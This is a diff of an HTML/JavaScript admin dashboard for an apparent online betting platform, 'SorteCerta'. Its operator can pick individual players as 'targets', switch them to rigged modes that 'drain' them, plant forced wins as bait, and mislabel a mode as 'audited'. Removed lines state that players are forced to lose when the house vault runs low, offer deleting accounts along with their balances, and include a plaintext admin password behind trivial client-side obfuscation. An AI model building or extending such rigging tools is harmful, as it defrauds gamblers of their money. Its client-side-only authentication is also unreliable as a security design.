@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SorteCerta | Supreme Command</title>
+    <title>SorteCerta | Supreme Command V2</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         :root {
             --bg-dark: #050505;
-            --bg-card: rgba(20, 20, 20, 0.7);
+            --bg-card: rgba(20, 20, 20, 0.85);
             --gold: #f1c40f;
             --gold-glow: rgba(241, 196, 15, 0.4);
             --green: #00e676;
@@ -68,20 +68,19 @@
         .error-msg { color: var(--red); font-size: 12px; margin-top: 15px; font-weight: bold; min-height: 15px; }
 
         /* ==============================================
-           DASHBOARD PRINCIPAL (ESCONDIDO INICIALMENTE)
+           DASHBOARD PRINCIPAL
            ============================================== */
-        #adminDashboard { display: none; width: 100%; height: 100vh; }
+        #adminDashboard { display: none; width: 100%; height: 100vh; display: flex; }
         
         /* SIDEBAR */
         .sidebar {
-            position: fixed; top: 0; left: 0; width: 250px; height: 100%;
-            background: rgba(10, 10, 10, 0.9); border-right: 1px solid var(--border-color);
-            padding: 20px 0; backdrop-filter: blur(10px); z-index: 100;
+            width: 260px; background: rgba(10, 10, 10, 0.95); border-right: 1px solid var(--border-color);
+            padding: 20px 0; backdrop-filter: blur(10px); display: flex; flex-direction: column;
         }
         .brand { text-align: center; padding-bottom: 20px; border-bottom: 1px solid #222; margin-bottom: 20px; }
         .brand i { font-size: 30px; color: var(--gold); margin-bottom: 10px; display: block; }
         .brand span { font-weight: 900; font-size: 18px; letter-spacing: 2px; color: #fff; }
-        .nav-menu { list-style: none; padding: 0 15px; }
+        .nav-menu { list-style: none; padding: 0 15px; flex: 1; }
         .nav-item { margin-bottom: 10px; }
         .nav-link {
             display: flex; align-items: center; gap: 15px; color: var(--text-muted);
@@ -89,18 +88,30 @@
             transition: 0.3s;
         }
         .nav-link:hover, .nav-link.active { background: rgba(241, 196, 15, 0.1); color: var(--gold); }
-        .nav-link i { width: 20px; text-align: center; }
+        
+        .panic-btn { margin: 15px; background: rgba(255, 23, 68, 0.1); border: 1px solid var(--red); color: var(--red); padding: 15px; border-radius: 8px; font-weight: 900; text-align: center; cursor: pointer; transition: 0.3s; text-transform: uppercase; box-shadow: 0 0 15px rgba(255, 23, 68, 0.2); }
+        .panic-btn:hover { background: var(--red); color: #fff; box-shadow: 0 0 25px rgba(255, 23, 68, 0.6); }
+        .panic-btn.active { background: var(--red); color: #fff; animation: blinkRed 1s infinite; }
 
         /* ÁREA DE CONTEÚDO */
-        .main-content { margin-left: 250px; padding: 30px; height: 100vh; overflow-y: auto; }
+        .main-content { flex: 1; padding: 30px; overflow-y: auto; }
         .top-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
         .top-header h1 { font-size: 24px; font-weight: 300; }
         .top-header strong { font-weight: 900; color: var(--gold); }
         .btn-logout { background: transparent; border: 1px solid var(--red); color: var(--red); padding: 8px 15px; border-radius: 6px; cursor: pointer; transition: 0.2s; }
         .btn-logout:hover { background: var(--red); color: #fff; }
 
-        /* GRID DE CARDS */
-        .dashboard-grid { display: grid; grid-template-columns: 1fr 2fr; gap: 20px; margin-bottom: 30px; }
+        /* KANBAN / METRICS */
+        .metrics-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 25px; }
+        .metric-card { background: var(--bg-card); border: 1px solid #333; border-radius: 12px; padding: 20px; border-top: 3px solid var(--gold); }
+        .metric-card.green { border-top-color: var(--green); }
+        .metric-card.red { border-top-color: var(--red); }
+        .metric-card.blue { border-top-color: #3498db; }
+        .metric-title { font-size: 11px; color: var(--text-muted); text-transform: uppercase; font-weight: bold; margin-bottom: 10px; }
+        .metric-value { font-size: 24px; font-weight: 900; color: #fff; }
+
+        /* GRID DE CONTROLE E LOGS */
+        .dashboard-grid { display: grid; grid-template-columns: 1.5fr 1fr; gap: 20px; margin-bottom: 30px; }
         
         .card {
             background: var(--bg-card); border: 1px solid var(--border-color);
@@ -109,11 +120,6 @@
         }
         .card-title { font-size: 13px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
         
-        /* CARD DO COFRE */
-        .vault-value { font-size: 40px; font-weight: 900; color: var(--green); text-shadow: 0 0 20px rgba(0, 230, 118, 0.4); margin-bottom: 15px; }
-        .btn-withdraw { width: 100%; background: rgba(0, 230, 118, 0.1); border: 1px solid var(--green); color: var(--green); padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
-        .btn-withdraw:hover { background: var(--green); color: #000; box-shadow: 0 0 15px rgba(0, 230, 118, 0.5); }
-
         /* FORM DE CONTROLE (MIRAR) */
         .control-form { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
         .form-group { display: flex; flex-direction: column; gap: 5px; }
@@ -123,6 +129,17 @@
         .form-group.full { grid-column: span 2; }
         .form-group.highlight input { border-color: var(--green); color: var(--green); font-weight: bold; background: rgba(0,230,118,0.05); }
         .btn-execute { grid-column: span 2; background: linear-gradient(90deg, var(--gold), #b8860b); border: none; color: #000; padding: 15px; border-radius: 8px; font-weight: 900; cursor: pointer; text-transform: uppercase; margin-top: 10px; }
+
+        /* SNIPER LOG */
+        .log-list { display: flex; flex-direction: column; gap: 10px; max-height: 250px; overflow-y: auto; padding-right: 5px; }
+        .log-list::-webkit-scrollbar { width: 4px; }
+        .log-list::-webkit-scrollbar-thumb { background: var(--gold); border-radius: 4px; }
+        .log-item { background: #111; border: 1px solid #333; padding: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; }
+        .log-info strong { color: var(--gold); font-family: monospace; }
+        .log-info span { color: var(--text-muted); display: block; font-size: 10px; margin-top: 3px; }
+        .log-action { font-weight: bold; padding: 3px 8px; border-radius: 4px; font-size: 10px; }
+        .bg-red { background: rgba(255, 23, 68, 0.1); color: var(--red); }
+        .bg-green { background: rgba(0, 230, 118, 0.1); color: var(--green); }
 
         /* TABELA DE JOGADORES */
         .table-container { width: 100%; overflow-x: auto; }
@@ -140,26 +157,25 @@
         .btn-act { padding: 6px 12px; border: none; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; color: #fff; }
         .btn-target { background: #3498db; }
         .btn-add { background: var(--green); color: #000; }
-        .btn-del { background: var(--red); }
 
         @keyframes rotateGlow { 100% { transform: rotate(360deg); } }
+        @keyframes blinkRed { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
 
         /* RESPONSIVO */
-        @media (max-width: 768px) {
-            .sidebar { transform: translateX(-100%); }
-            .main-content { margin-left: 0; padding: 15px; }
+        @media (max-width: 900px) {
+            #adminDashboard { flex-direction: column; }
+            .sidebar { width: 100%; height: auto; border-right: none; border-bottom: 1px solid #333; padding: 10px; flex-direction: row; flex-wrap: wrap; justify-content: space-between; align-items: center; }
+            .brand { border: none; margin: 0; padding: 0; display: flex; align-items: center; gap: 10px; }
+            .brand i { margin: 0; font-size: 20px; }
+            .nav-menu { display: none; }
+            .panic-btn { margin: 0; padding: 10px; font-size: 12px; }
+            .metrics-row { grid-template-columns: 1fr 1fr; }
             .dashboard-grid { grid-template-columns: 1fr; }
-            .control-form { grid-template-columns: 1fr; }
-            .form-group.full { grid-column: span 1; }
-            .btn-execute { grid-column: span 1; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ==============================================
-         TELA DE LOGIN (SENHA OBFUSCADA)
-         ============================================== -->
     <div id="loginScreen">
         <div class="login-box">
             <div class="login-logo"><i class="fa-solid fa-fingerprint"></i></div>
@@ -173,89 +189,98 @@
         </div>
     </div>
 
-    <!-- ==============================================
-         PAINEL DE CONTROLE SUPREMO
-         ============================================== -->
-    <div id="adminDashboard">
+    <div id="adminDashboard" style="display:none;">
         
-        <!-- SIDEBAR -->
         <nav class="sidebar">
             <div class="brand">
                 <i class="fa-solid fa-crown"></i>
-                <span>SorteCerta</span>
+                <span>SorteCerta Admin</span>
             </div>
             <ul class="nav-menu">
                 <li class="nav-item"><a href="#" class="nav-link active"><i class="fa-solid fa-chart-pie"></i> Visão Geral</a></li>
-                <li class="nav-item"><a href="#" class="nav-link"><i class="fa-solid fa-users-crosshairs"></i> Alvos (Radar)</a></li>
-                <li class="nav-item"><a href="#" class="nav-link"><i class="fa-solid fa-vault"></i> Cofre RTP</a></li>
-                <li class="nav-item"><a href="#" class="nav-link"><i class="fa-solid fa-gear"></i> Configurações</a></li>
+                <li class="nav-item"><a href="#" class="nav-link"><i class="fa-solid fa-users-crosshairs"></i> Jogadores</a></li>
+                <li class="nav-item"><a href="#" class="nav-link"><i class="fa-solid fa-gamepad"></i> Desempenho Jogos</a></li>
             </ul>
+            <button class="panic-btn" id="btnManutencao" onclick="toggleManutencao()"><i class="fa-solid fa-triangle-exclamation"></i> Ativar Manutenção</button>
         </nav>
 
-        <!-- MAIN CONTENT -->
         <main class="main-content">
             <div class="top-header">
-                <h1>Painel <strong>Supremo</strong></h1>
-                <button class="btn-logout" onclick="fazerLogout()"><i class="fa-solid fa-right-from-bracket"></i> Encerrar Sessão</button>
+                <h1>Dashboard <strong>Financeiro</strong></h1>
+                <button class="btn-logout" onclick="fazerLogout()"><i class="fa-solid fa-right-from-bracket"></i> Sair</button>
+            </div>
+
+            <div class="metrics-row">
+                <div class="metric-card">
+                    <div class="metric-title"><i class="fa-solid fa-vault"></i> Cofre Global (RTP)</div>
+                    <div class="metric-value" id="displayCaixaGlobal">R$ 0,00</div>
+                    <button onclick="zerarCaixaDaCasa()" style="margin-top:10px; background:transparent; border:1px solid var(--gold); color:var(--gold); padding:4px 8px; border-radius:4px; font-size:10px; cursor:pointer;">Sacar Cofre</button>
+                </div>
+                <div class="metric-card green">
+                    <div class="metric-title"><i class="fa-solid fa-arrow-down"></i> Total Depositado</div>
+                    <div class="metric-value" id="displayDepositos">R$ 0,00</div>
+                </div>
+                <div class="metric-card red">
+                    <div class="metric-title"><i class="fa-solid fa-arrow-up"></i> Total Sacado</div>
+                    <div class="metric-value" id="displaySaques">R$ 0,00</div>
+                </div>
+                <div class="metric-card blue">
+                    <div class="metric-title"><i class="fa-solid fa-users"></i> Ativos Agora</div>
+                    <div class="metric-value" id="contadorUsers">0</div>
+                </div>
             </div>
 
             <div class="dashboard-grid">
-                <!-- COFRE GLOBAL -->
                 <div class="card">
-                    <div class="card-title"><span><i class="fa-solid fa-vault"></i> Cofre da Casa (RTP)</span> <i class="fa-solid fa-circle-info" style="color:#555;" title="Dinheiro acumulado das perdas dos jogadores."></i></div>
-                    <div class="vault-value" id="displayCaixaGlobal">R$ 0,00</div>
-                    <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 20px;">*As vitórias naturais dos jogadores são pagas com este saldo. Se o saldo for insuficiente, a máquina força o jogador a perder.</p>
-                    <button class="btn-withdraw" onclick="zerarCaixaDaCasa()"><i class="fa-solid fa-money-bill-transfer"></i> Sacar Lucro P/ Banco</button>
-                </div>
-
-                <!-- CONTROLE MENTAL / FORÇAR -->
-                <div class="card">
-                    <div class="card-title"><span><i class="fa-solid fa-gamepad"></i> Controle Individual do Jogador</span></div>
+                    <div class="card-title"><span><i class="fa-solid fa-crosshairs"></i> Controle de Atirador (Sniper)</span></div>
                     <div class="control-form">
                         <div class="form-group full">
                             <label>ID do Alvo</label>
-                            <input type="text" id="inputID" placeholder="Selecione um jogador no Radar abaixo..." readonly style="color:#777; cursor:not-allowed;">
+                            <input type="text" id="inputID" placeholder="Selecione na tabela abaixo..." readonly style="color:#777;">
                         </div>
                         <div class="form-group">
                             <label>Banca Atual (R$)</label>
-                            <input type="number" id="inputSaldo" step="0.01" placeholder="0.00">
+                            <input type="number" id="inputSaldo" step="0.01">
                         </div>
                         <div class="form-group">
-                            <label>Modo de Operação</label>
+                            <label>Modo de Algoritmo</label>
                             <select id="inputModo">
-                                <option value="normal">Normal (Justo)</option>
+                                <option value="normal">Normal (Auditado)</option>
                                 <option value="desfarcado">Disfarçado (Segura banca)</option>
                                 <option value="agressivo">Agressivo (Drena a seco)</option>
                             </select>
                         </div>
                         <div class="form-group highlight full">
-                            <label>Isca Injetável: Forçar Ganho Exato (R$)</label>
-                            <input type="number" id="inputGanho" placeholder="Ex: 50.00 para pagar 50 reais na próxima jogada">
+                            <label>Isca: Forçar Ganho Exato (R$)</label>
+                            <input type="number" id="inputGanho" placeholder="Ex: 50.00 para pagar 50 reais">
                         </div>
-                        <button class="btn-execute" onclick="executarOrdem()"><i class="fa-solid fa-bolt"></i> Executar Ordem Suprema</button>
+                        <button class="btn-execute" onclick="executarOrdem()"><i class="fa-solid fa-bolt"></i> Executar Ordem</button>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-title"><span><i class="fa-solid fa-list-check"></i> Últimos Disparos</span></div>
+                    <div class="log-list" id="sniperLog">
+                        <div style="color:#555; text-align:center; font-size:12px; margin-top:20px;">Nenhuma ação recente.</div>
                     </div>
                 </div>
             </div>
 
-            <!-- RADAR DE JOGADORES -->
             <div class="card" style="margin-bottom: 50px;">
-                <div class="card-title">
-                    <span><i class="fa-solid fa-radar"></i> Radar em Tempo Real</span>
-                    <span style="color:var(--gold); font-weight:bold;">Online: <span id="contadorUsers">0</span></span>
-                </div>
+                <div class="card-title"><span><i class="fa-solid fa-radar"></i> Radar em Tempo Real</span></div>
                 <div class="table-container">
                     <table>
                         <thead>
                             <tr>
-                                <th>ID do Dispositivo</th>
-                                <th>Saldo Real</th>
-                                <th>Modo Atual</th>
-                                <th>Isca Armada (Pendente)</th>
+                                <th>ID Dispositivo</th>
+                                <th>Banca</th>
+                                <th>Algoritmo</th>
+                                <th>Isca Pendente</th>
                                 <th>Ações Táticas</th>
                             </tr>
                         </thead>
                         <tbody id="tabelaCorpo">
-                            <tr><td colspan="5" style="text-align:center; padding: 30px; color:#555;"><i class="fa-solid fa-spinner fa-spin"></i> Conectando ao Satélite...</td></tr>
+                            <tr><td colspan="5" style="text-align:center; padding: 30px; color:#555;"><i class="fa-solid fa-spinner fa-spin"></i> Satélite escaneando...</td></tr>
                         </tbody>
                     </table>
                 </div>
@@ -263,53 +288,33 @@
         </main>
     </div>
 
-    <!-- ==============================================
-         SISTEMA, CRIPTOGRAFIA E FIREBASE
-         ============================================== -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+        import { getDatabase, ref, onValue, set, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        /* --- SCRIPT DE SEGURANÇA E OBFUSCAÇÃO --- */
-        // O array abaixo é o resultado matemático que esconde a palavra "Vittor262200". 
-        // A lógica soma +5 no código da tabela ASCII. Impossível ler a olho nu.
+        /* --- OBFUSCAÇÃO DE SENHA --- */
         const _0xkey = [91, 110, 121, 121, 116, 119, 55, 59, 55, 55, 53, 53];
-        
         window.checkAcesso = function() {
             let input = document.getElementById('pwdInput').value;
             let msg = document.getElementById('loginError');
-            
-            if(!input || input.length !== _0xkey.length) {
-                msg.innerText = "Acesso Negado."; return;
-            }
-            
+            if(!input || input.length !== _0xkey.length) { msg.innerText = "Acesso Negado."; return; }
             let valid = true;
-            for(let i=0; i < input.length; i++) {
-                if(input.charCodeAt(i) + 5 !== _0xkey[i]) valid = false;
-            }
-
+            for(let i=0; i < input.length; i++) { if(input.charCodeAt(i) + 5 !== _0xkey[i]) valid = false; }
             if(valid) {
                 sessionStorage.setItem('admin_auth_supreme', 'authorized');
                 document.getElementById('loginScreen').style.opacity = '0';
                 setTimeout(() => {
                     document.getElementById('loginScreen').style.display = 'none';
-                    document.getElementById('adminDashboard').style.display = 'block';
+                    document.getElementById('adminDashboard').style.display = 'flex';
                 }, 500);
-            } else {
-                msg.innerText = "Chave Inválida. Acesso Negado.";
-                document.getElementById('pwdInput').value = '';
-            }
+            } else { msg.innerText = "Chave Inválida. Acesso Negado."; document.getElementById('pwdInput').value = ''; }
         };
 
-        window.fazerLogout = function() {
-            sessionStorage.removeItem('admin_auth_supreme');
-            location.reload();
-        };
+        window.fazerLogout = function() { sessionStorage.removeItem('admin_auth_supreme'); location.reload(); };
 
-        // Verifica sessão ao abrir a página
         if(sessionStorage.getItem('admin_auth_supreme') === 'authorized') {
             document.getElementById('loginScreen').style.display = 'none';
-            document.getElementById('adminDashboard').style.display = 'block';
+            document.getElementById('adminDashboard').style.display = 'flex';
         }
 
         /* --- FIREBASE SETUP --- */
@@ -320,40 +325,59 @@
         };
         const db = getDatabase(initializeApp(firebaseConfig));
 
-        // 1. MONITORAMENTO DO COFRE GLOBAL
-        onValue(ref(db, 'sistema/caixa_global'), (snapshot) => {
-            let caixa = parseFloat(snapshot.val() || 0);
+        let isManutencao = false;
+
+        // 1. MÉTRICAS GLOBAIS E COFRE
+        onValue(ref(db, 'sistema'), (snapshot) => {
+            const sys = snapshot.val() || {};
+            let caixa = parseFloat(sys.caixa_global || 0);
+            let deps = parseFloat(sys.total_depositos || 0); // Preparando terreno pra quando implementarmos leitura real
+            let saqs = parseFloat(sys.total_saques || 0);
+            
+            isManutencao = sys.manutencao === true;
+            
             document.getElementById('displayCaixaGlobal').innerText = "R$ " + caixa.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            document.getElementById('displayDepositos').innerText = "R$ " + deps.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+            document.getElementById('displaySaques').innerText = "R$ " + saqs.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+
+            const btnManu = document.getElementById('btnManutencao');
+            if(isManutencao) {
+                btnManu.classList.add('active');
+                btnManu.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i> MANUTENÇÃO ATIVA';
+            } else {
+                btnManu.classList.remove('active');
+                btnManu.innerHTML = '<i class="fa-solid fa-power-off"></i> Ativar Manutenção';
+            }
         });
 
-        // 2. FUNÇÃO ZERAR COFRE (SACAR)
+        window.toggleManutencao = () => {
+            set(ref(db, 'sistema/manutencao'), !isManutencao);
+        };
+
         window.zerarCaixaDaCasa = () => {
-            if(confirm("ATENÇÃO: Deseja relatar o saque e zerar o cofre? A máquina passará a focar na arrecadação (Loss) até ter saldo novamente.")) {
+            if(confirm("Confirmar saque e zerar o Cofre RTP? A plataforma focará em recuperação.")) {
                 set(ref(db, 'sistema/caixa_global'), 0);
+                registrarLog("SISTEMA", "Saque do Cofre Global efetuado", "bg-green");
             }
         };
 
-        // 3. RADAR DE JOGADORES ONLINE
+        // 2. RADAR DE JOGADORES ONLINE
         onValue(ref(db, 'usuarios'), (snapshot) => {
             const data = snapshot.val();
             const tbody = document.getElementById('tabelaCorpo');
-            
             if (!data) {
-                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding: 20px; color:#555;">Nenhum jogador rastreado no momento.</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding: 20px; color:#555;">Nenhum jogador rastreado.</td></tr>';
                 document.getElementById('contadorUsers').innerText = "0";
                 return;
             }
-
             tbody.innerHTML = '';
             let contador = 0;
-
             for (let id in data) {
                 contador++;
                 const u = data[id];
                 let saldo = parseFloat(u.saldo || 0).toFixed(2);
                 let isca = parseFloat(u.forcarGanho || 0).toFixed(2);
                 let modo = u.modo || 'normal';
-                
                 let bClass = `b-${modo}`;
                 
                 tbody.innerHTML += `
@@ -368,7 +392,6 @@
                             <div class="action-btns">
                                 <button class="btn-act btn-target" onclick="carregarAlvo('${id}', ${saldo}, '${modo}', ${isca})" title="Mirar"><i class="fa-solid fa-crosshairs"></i></button>
                                 <button class="btn-act btn-add" onclick="somarSaldo('${id}')" title="Injetar R$ 10">+10</button>
-                                <button class="btn-act btn-del" onclick="deletarAlvo('${id}')" title="Expulsar Jogador"><i class="fa-solid fa-trash"></i></button>
                             </div>
                         </td>
                     </tr>
@@ -377,48 +400,72 @@
             document.getElementById('contadorUsers').innerText = contador;
         });
 
-        // 4. AÇÕES DE TÁTICA (MIRAR)
+        // 3. AÇÕES DE TÁTICA (MIRAR E ATIRAR)
         window.carregarAlvo = (id, saldo, modo, ganho) => {
             document.getElementById('inputID').value = id;
             document.getElementById('inputSaldo').value = saldo;
             document.getElementById('inputModo').value = modo;
             document.getElementById('inputGanho').value = ganho > 0 ? ganho : '';
-            window.scrollTo({ top: 0, behavior: 'smooth' }); 
         };
 
         window.executarOrdem = () => {
             const id = document.getElementById('inputID').value;
-            if (!id) return alert("Erro: Você precisa mirar em um jogador no Radar primeiro.");
+            if (!id) return alert("Mire em um jogador primeiro.");
 
             const saldo = parseFloat(document.getElementById('inputSaldo').value || 0);
             const modo = document.getElementById('inputModo').value;
             const ganho = parseFloat(document.getElementById('inputGanho').value || 0);
 
-            set(ref(db, `usuarios/${id}`), {
-                saldo: saldo,
-                modo: modo,
-                forcarGanho: ganho
-            }).then(() => {
-                let msg = document.getElementById('displayMensagem');
-                alert(`Ordem Suprema executada com sucesso no alvo: ${id}`);
+            set(ref(db, `usuarios/${id}`), { saldo: saldo, modo: modo, forcarGanho: ganho }).then(() => {
+                alert(`Ordem executada no alvo: ${id}`);
+                
+                let acaoTxt = ganho > 0 ? `Isca Armada: R$ ${ganho}` : `Modo alterado: ${modo}`;
+                registrarLog(id, acaoTxt, ganho > 0 ? 'bg-green' : 'bg-red');
+                
                 document.getElementById('inputGanho').value = ''; 
             });
         };
 
-        // 5. ATALHOS RÁPIDOS
         window.somarSaldo = (id) => {
             const refSaldo = ref(db, `usuarios/${id}/saldo`);
             onValue(refSaldo, (snap) => {
                 let s = parseFloat(snap.val() || 0) + 10;
                 set(refSaldo, s);
+                registrarLog(id, "Bônus Injetado: +R$ 10", "bg-green");
             }, { onlyOnce: true });
         };
 
-        window.deletarAlvo = (id) => {
-            if(confirm(`Tem certeza que deseja DELETAR a conta de ${id} e sumir com o saldo dele?`)) {
-                set(ref(db, `usuarios/${id}`), null);
-            }
-        };
+        // 4. SISTEMA DE LOGS (SNIPER HISTORY)
+        function registrarLog(alvo, acao, corClasse) {
+            const logRef = ref(db, 'sistema/log_comandos');
+            const data = new Date();
+            const timeStr = `${data.getHours().toString().padStart(2,'0')}:${data.getMinutes().toString().padStart(2,'0')}`;
+            
+            push(logRef, { alvo: alvo, acao: acao, cor: corClasse, hora: timeStr });
+        }
+
+        onValue(ref(db, 'sistema/log_comandos'), (snapshot) => {
+            const data = snapshot.val();
+            const logContainer = document.getElementById('sniperLog');
+            if (!data) return;
+            
+            logContainer.innerHTML = '';
+            // Transforma o objeto em array e inverte pra mostrar do mais novo pro mais antigo
+            const logsArray = Object.values(data).reverse().slice(0, 15); // Mostra só os 15 últimos
+
+            logsArray.forEach(log => {
+                logContainer.innerHTML += `
+                    <div class="log-item">
+                        <div class="log-info">
+                            <strong>${log.alvo}</strong>
+                            <span><i class="fa-regular fa-clock"></i> Hoje, ${log.hora}</span>
+                        </div>
+                        <div class="log-action ${log.cor}">${log.acao}</div>
+                    </div>
+                `;
+            });
+        });
+
     </script>
 </body>
 </html>
